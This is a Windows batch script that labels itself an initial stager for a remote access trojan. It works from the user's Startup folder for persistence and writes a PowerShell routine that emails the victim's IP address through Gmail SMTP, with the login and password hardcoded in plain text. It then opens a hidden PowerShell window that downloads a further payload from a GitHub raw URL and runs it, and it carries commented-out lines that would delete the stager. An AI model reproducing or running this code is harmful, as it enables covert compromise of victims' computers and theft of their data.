
@echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@REM move into startup directory
cd %STARTUP%

@REM Set up SMTP
(

    echo $email = "lukeosullivan123@gmail.com"
    echo $password = "osull1van"
    echo $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
    echo echo "ip:$ip" > "$env:UserName.rat"

    @REM email process
    echo $subject = "$env:UserName logs"
    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
    echo $smtp.EnableSSL = $true
    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
    echo $smtp.Send($email, $email, $subject, $ip);

) > smtp.txt

@REM writeS payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload placeholder
powershell ./wget.cmd


@REM cd %initialPath%
@REM del init.cmd
